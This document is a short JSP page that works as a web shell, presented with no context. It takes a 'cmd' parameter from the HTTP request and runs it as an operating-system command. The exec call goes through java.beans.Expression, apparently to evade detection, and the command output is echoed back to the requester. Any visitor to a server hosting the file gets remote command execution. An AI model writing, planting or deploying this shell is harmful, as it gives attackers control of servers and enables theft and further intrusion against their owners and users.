<%@ page language="java" pageEncoding="UTF-8" %>
<%
    String cmd = request.getParameter("cmd");
    java.beans.Expression shell = new java.beans.Expression(Runtime.getRuntime(),"exec",new Object[]{cmd});
    java.io.InputStream in = ((Process)shell.getValue()).getInputStream();
    StringBuilder outStr = new StringBuilder();
    response.getWriter().print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        outStr.append(s + "\n");
    }
    response.getWriter().print(outStr.toString());
    response.getWriter().print("</pre>");
%>